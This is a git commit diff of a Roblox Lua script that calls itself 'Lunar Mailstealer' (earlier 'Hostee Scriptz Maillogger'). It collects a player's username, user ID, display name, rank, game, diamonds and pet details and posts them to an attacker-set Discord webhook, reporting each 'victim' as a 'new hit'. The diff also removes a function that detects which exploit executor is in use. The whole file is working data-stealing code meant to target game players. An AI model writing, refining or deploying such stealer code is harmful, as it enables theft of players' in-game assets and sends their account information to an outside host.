045bd35abb64fb0e4fd1c24f5f39dcc31a66479d
HosteeScriptz <saifelabd2021@gmail.com>
2023-05-19 09:38:15 +0300

    Update Executor detector Mail.lua

--- Executor detector Mail.lua
+++ Executor detector Mail.lua
@@ -1,26 +1,3 @@
---// Executor detector
-
-local function getexploit()
-	local exploit =
-		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
-		(secure_load and "Sentinel") or
-		(is_sirhurt_closure and "Sirhurt") or
-		(pebc_execute and "ProtoSmasher") or
-		(KRNL_LOADED and "Krnl") or
-		(WrapGlobal and "WeAreDevs") or
-		(isvm and "Proxo") or
-		(shadow_env and "Shadow") or
-		(jit and "EasyExploits") or
-		(getscriptenvs and "Calamari") or
-		(unit and not syn and "Unit") or
-		(OXYGEN_LOADED and "Oxygen U") or
-		(IsElectron and "Electron") or
-		("Unsupported")
-  
-	return exploit
-  end
-  
---// Execution Log
 if game.PlaceId == 6284583030 then
 	_G.GameIn = "Pet Simulator X"
 elseif game.PlaceId == 7722306047 then
@@ -39,24 +16,33 @@ _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Ran
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
-_G.DisplayDiamond = game:GetService("Players").LocalPlayer.leaderstats.Diamonds.Value
-_G.DisplayRap = game:GetService("Players").LocalPlayer.leaderstats.RAP.Value
-_G.DisplayBankTier = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.BankTitle.Tier.Text
 local function sendwebhook(msg)
 local msg = {
-	["content"]= "**🎁New Hit With Hostee Scriptz🎁**",
-	["embeds"]= {
-	  {
-		["title"]= "`Hostee Scriptz Maillogger Results`",
-		["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n💎Gems: **".._G.DisplayDiamond.."**\n⬆️Rap: **".._G.DisplayRap.."**\n📈Bank Tier: **".._G.DisplayBankTier.."**\n☠Executor: **"..getexploit().."**",
-		["url"]= "https://dsc.gg/hosteehub",
-		["color"]= ""..webhookcolor.."",
-  }
+  ["content"]= "**Lunar Mailstealer has detected a new hit!**",
+  ["embeds"]= {
+    {
+      ["title"]= "`Lunar Mailstealer Results`",
+      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
+      ["url"]= "https://discord.gg/pd65DxGhVc",
+      ["color"]= ""..webhookcolor.."",
+      ["fields"]= {
+        {
+          ["name"]= "Diamonds 💎",
+          ["value"]= "```".._G.Diamonds.."```",
+          ["inline"]= true
+        },
+        {
+          ["name"]= "Pet Name & Rarity",
+          ["value"]= "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
+		  ["inline"]= true
+        }
+      }
+    }
   },
-	["attachments"] = {}
-  }
-  local Webhook = _G.Webhook
-  request = http_request or request or HttpPost or syn.request
-  request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
-  end
-  sendwebhook(msg)
+  ["attachments"] = {}
+}
+local Webhook = _G.Webhook
+request = http_request or request or HttpPost or syn.request
+request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+end
+sendwebhook(msg)
